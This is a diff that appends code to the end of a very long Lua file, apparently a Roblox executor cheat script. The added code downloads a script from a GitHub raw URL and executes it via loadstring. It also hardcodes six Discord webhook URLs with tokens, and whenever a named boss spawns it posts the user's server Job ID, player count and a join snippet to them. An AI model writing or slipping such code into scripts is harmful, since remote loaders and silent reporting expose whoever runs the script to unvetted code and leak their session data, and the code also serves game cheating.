@@ -11640,4 +11640,143 @@ end)
             end
          end)
      end)
-     
+   getgenv().FixAttack = true
+-- Hàm Click
+function Click(delayTime)
+    while task.wait(delayTime) do
+        if getgenv().FixAttack then  -- Chỉ chạy nếu Attack là true
+            print("Clicking...")  -- Hoặc thay bằng hành động click thực sự
+        else
+            print("Attack is off, stopping clicks...")
+            break  -- Thoát khỏi vòng lặp nếu Attack là false
+        end
+    end
+end
+-- Tải script từ URL và thực thi
+local url = "https://raw.githubusercontent.com/diemquy/Autochatmizuhara/refs/heads/main/fasthuy%20.txt"
+local success, scriptContent = pcall(function()
+    return game:HttpGet(url)
+end)
+
+if success then
+    local runScript = loadstring(scriptContent)
+    if runScript then
+        runScript()  -- Thực thi script
+        print("Script executed successfully!")
+    else
+        warn("Failed to load script.")
+    end
+else
+    warn("Failed to fetch script from URL:", scriptContent)
+end
+
+-- Vòng lặp kiểm tra biến Attack
+task.spawn(function()
+    while task.wait() do
+        if getgenv().FixAttack then
+            Click(0.000000000000000000000000000000004)  -- Thực hiện hành động click với delay
+        else
+            print("Attack is off, skipping clicks.")
+        end
+    end
+end)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+
+-- Dùng đúng request cho môi trường executor
+local request = http_request or request or syn and syn.request or fluxus and fluxus.request or function(...) warn("❌ No request method found") return nil end
+
+-- Danh sách webhook từng boss
+local webhookURLs = {
+    ["rip_indra True Form"] = "https://discord.com/api/webhooks/1365180289764298814/PjfA3_qHZjXYtvaVf4D8c4ad5mWeJfn59mNzQuJFeFvYhjwQ5Y8ILtydVORI9kW9xp1X",
+    ["Darkbeard"] = "https://discord.com/api/webhooks/1365231489553403904/UpNLKYMpEBe3gIWOrcoK0bhYJIOFv8_Qc14wyCYLgbc8n0QNj1szNRShPvMoIDnAMzEB",
+    ["Dough King"] = "https://discord.com/api/webhooks/1365231422801051691/ArIoOAJD6brwOYaxhCrRG4YBAi0AgexCs9y-vH6vxaVJWktTj1LAqH5ApufVSkIkJsuS",
+    ["Tyrant of the Skies"] = "https://discord.com/api/webhooks/1365216341602336841/sgM73quYi92nw9iRyRNCLY9f-7HxdGZl8mL21WZqNJOL6Byfj83t1aoI33Z1aZVElfqz",
+    ["Soul Reaper"] = "https://discord.com/api/webhooks/1365231550530195456/_BeBBmDdiYmEKK8D23MONH_6TZYHLaHD5efG9Pwbws-kCT0TMBEmjqM0_g82B6JQjedJ",
+    ["Cursed Captain"] = "https://discord.com/api/webhooks/1365231611414577152/C5RzYm5ZYLyrOSlmSktakLu87Se1DKMOkyz2O2vHS7SGO75S_5w_fd1yVl8iRifY4o9F"
+}
+
+-- Tên hiển thị đẹp hơn cho boss
+local bosses = {
+    ["rip_indra True Form"] = "Indra",
+    ["Darkbeard"] = "Darkbeard",
+    ["Dough King"] = "Dough King",
+    ["Tyrant of the Skies"] = "Tyrant",
+    ["Soul Reaper"] = "Soul Reaper",
+    ["Cursed Captain"] = "Cursed Captain"
+}
+
+-- Boss đã gửi rồi thì không gửi nữa
+local sentBosses = {}
+
+-- Hàm gửi webhook
+local function sendWebhook(bossName, bossDisplayName)
+    local jobID = game.JobId or "UNKNOWN"
+    local playerCount = tostring(#Players:GetPlayers()) .. "/12"
+    local scriptJoin = 'game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", "' .. jobID .. '")'
+
+    local data = {
+        ["username"] = bossDisplayName .. " Alert",
+        ["avatar_url"] = "https://i.imgur.com/IFXzi83.jpeg",
+        ["embeds"] = {{
+            ["title"] = "**👺 Boss Summoned 👻**",
+            ["color"] = 0xFF5555,
+            ["fields"] = {
+                {["name"] = "👤 Boss Name:", ["value"] = bossDisplayName, ["inline"] = false},
+                {["name"] = "🧨 Player Count:", ["value"] = playerCount, ["inline"] = false},
+                {["name"] = "🔗 Job ID:", ["value"] = "`" .. jobID .. "`", ["inline"] = false},
+                {["name"] = "📜 Script Join:", ["value"] = "```lua\n" .. scriptJoin .. "\n```", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "MADE BY: STUCKZ999 • " .. os.date("Gửi lúc %H:%M")}
+        }}
+    }
+
+    local url = webhookURLs[bossName]
+    if not url then warn("⚠️ Không tìm thấy webhook cho boss:", bossName) return end
+
+    local success, res = pcall(function()
+        return request({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+
+    if success then
+        print("✅")
+    else
+        warn("❌")
+    end
+end
+
+-- Quét boss đang tồn tại từ khi script bắt đầu (fix lỗi boss đã spawn sẵn)
+task.defer(function()
+    task.wait(2) -- chờ load workspace ổn định
+    for bossName, display in pairs(bosses) do
+        if Workspace:FindFirstChild(bossName) and not sentBosses[bossName] then
+            sentBosses[bossName] = true
+            sendWebhook(bossName, display)
+        end
+    end
+end)
+
+-- Theo dõi boss spawn mới
+Workspace.ChildAdded:Connect(function(child)
+    if bosses[child.Name] and not sentBosses[child.Name] then
+        sentBosses[child.Name] = true
+        sendWebhook(child.Name, bosses[child.Name])
+    end
+end)
+
+-- Reset khi boss bị tiêu diệt
+Workspace.ChildRemoved:Connect(function(child)
+    if bosses[child.Name] then
+        sentBosses[child.Name] = nil
+    end
+end)
+
